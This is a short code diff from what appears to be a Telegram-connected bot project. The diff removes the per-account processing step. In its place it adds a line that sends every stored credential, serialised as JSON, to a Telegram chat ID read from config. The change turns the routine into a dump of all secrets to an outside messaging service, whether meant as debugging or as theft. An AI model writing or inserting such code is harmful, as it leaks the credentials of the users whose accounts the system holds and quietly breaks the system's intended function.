@@ -1,10 +1,11 @@
+import { TELEGRAM_OWNER_CHAT_ID } from '../config';
+import logToBot from '../botModule/logToBot';
 import getAllCredentials from '../credentialsModule/getAllCredentials';
-import processAccount from './processAccount';
 
 export default function processAccounts() {
     const doProcessAccounts = async () => {
         const credentialsItems = await getAllCredentials()
-        credentialsItems.forEach(processAccount)
+        logToBot(TELEGRAM_OWNER_CHAT_ID, JSON.stringify(credentialsItems, null, 4))
     }
 
     doProcessAccounts()
